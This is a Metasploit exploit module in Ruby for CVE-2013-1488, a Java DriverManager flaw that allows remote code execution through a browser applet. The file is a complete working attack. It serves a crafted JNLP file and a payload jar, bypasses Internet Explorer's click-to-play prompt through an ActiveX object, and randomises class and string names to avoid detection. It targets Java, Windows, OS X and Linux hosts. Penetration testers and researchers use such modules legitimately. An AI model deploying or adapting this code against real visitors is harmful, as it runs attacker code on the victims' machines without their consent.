##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  def initialize( info = {} )

    super( update_info( info,
      'Name'          => 'Java Applet Driver Manager Privileged toString() Remote Code Execution',
      'Description'   => %q{
          This module abuses the java.sql.DriverManager class where the toString() method
        is called over user supplied classes, from a doPrivileged block. The vulnerability
        affects Java version 7u17 and earlier. This exploit bypasses click-to-play on IE
        throw a specially crafted JNLP file. This bypass is applied mainly to IE, when Java
        Web Start can be launched automatically throw the ActiveX control. Otherwise the
        applet is launched without click-to-play bypass.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'James Forshaw', # Vulnerability discovery and Analysis
          'juan vazquez' # Metasploit module
        ],
      'References'    =>
        [
          [ 'CVE', '2013-1488' ],
          [ 'OSVDB', '91472' ],
          [ 'BID', '58504' ],
          [ 'URL', 'http://www.contextis.com/research/blog/java-pwn2own/' ],
          [ 'URL', 'http://immunityproducts.blogspot.com/2013/04/yet-another-java-security-warning-bypass.html' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-076/' ]
        ],
      'Platform'      => [ 'java', 'win', 'osx', 'linux' ],
      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
      'Targets'       =>
        [
          [ 'Generic (Java Payload)',
            {
              'Platform' => ['java'],
              'Arch' => ARCH_JAVA,
            }
          ],
          [ 'Windows x86 (Native Payload)',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Mac OS X x86 (Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Linux x86 (Native Payload)',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86,
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 10 2013'
    ))
  end


  def setup
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-1488", "Exploit.class")
    @exploit_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-1488", "FakeDriver.class")
    @driver_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-1488", "FakeDriver2.class")
    @driver2_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-1488", "META-INF", "services", "java.lang.Object")
    @object_services = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-1488", "META-INF", "services", "java.sql.Driver")
    @driver_services = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }

    @exploit_class_name = rand_text_alpha("Exploit".length)
    @exploit_class.gsub!("Exploit", @exploit_class_name)

    @jnlp_name = rand_text_alpha(8)

    super
  end

  def jnlp_file
    jnlp_uri = "#{get_uri}/#{@jnlp_name}.jnlp"

    jnlp = %Q|
<?xml version="1.0" encoding="utf-8"?>
<jnlp spec="1.0" xmlns:jfx="http://javafx.com" href="#{jnlp_uri}">
  <information>
    <title>Applet Test JNLP</title>
    <vendor>#{rand_text_alpha(8)}</vendor>
    <description>#{rand_text_alpha(8)}</description>
    <offline-allowed/>
  </information>

  <resources>
    <j2se version="1.7+" href="http://java.sun.com/products/autodl/j2se" />
    <jar href="#{rand_text_alpha(8)}.jar" main="true" />
  </resources>
  <applet-desc name="#{rand_text_alpha(8)}" main-class="#{@exploit_class_name}" width="1" height="1">
    <param name="__applet_ssv_validated" value="true"></param>
  </applet-desc>
  <update check="background"/>
</jnlp>
    |
    return jnlp
  end

  def on_request_uri(cli, request)
    print_status("handling request for #{request.uri}")

    case request.uri
    when /\.jnlp$/i
      send_response(cli, jnlp_file, { 'Content-Type' => "application/x-java-jnlp-file" })
    when /\.jar$/i
      jar = payload.encoded_jar
      jar.add_file("#{@exploit_class_name}.class", @exploit_class)
      jar.add_file("FakeDriver.class", @driver_class)
      jar.add_file("FakeDriver2.class", @driver2_class)
      jar.add_file("META-INF/services/java.lang.Object", @object_services)
      jar.add_file("META-INF/services/java.sql.Driver", @driver_services)
      metasploit_str = rand_text_alpha("metasploit".length)
      payload_str = rand_text_alpha("payload".length)
      jar.entries.each { |entry|
        entry.name.gsub!("metasploit", metasploit_str)
        entry.name.gsub!("Payload", payload_str)
        entry.data = entry.data.gsub("metasploit", metasploit_str)
        entry.data = entry.data.gsub("Payload", payload_str)
      }
      jar.build_manifest

      send_response(cli, jar, { 'Content-Type' => "application/octet-stream" })
    when /\/$/
      payload = regenerate_payload(cli)
      if not payload
        print_error("Failed to generate the payload.")
        send_not_found(cli)
        return
      end
      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
    else
      send_redirect(cli, get_resource() + '/', '')
    end

  end

  def generate_html
    jnlp_uri = "#{get_uri}/#{@jnlp_name}.jnlp"

    # When the browser is IE, the ActvX is used in order to load the malicious JNLP, allowing click2play bypass
    # Else an <applet> tag is used to load the malicious applet, this time there isn't click2play bypass
    html = %Q|
    <html>
    <body>
    <object codebase="http://java.sun.com/update/1.6.0/jinstall-6-windows-i586.cab#Version=6,0,0,0" classid="clsid:5852F5ED-8BF4-11D4-A245-0080C6F74284" height=0 width=0>
    <param name="app" value="#{jnlp_uri}">
    <param name="back" value="true">
    <applet archive="#{rand_text_alpha(8)}.jar" code="#{@exploit_class_name}.class" width="1" height="1"></applet>
    </object>
    </body>
    </html>
    |
    return html
  end

end
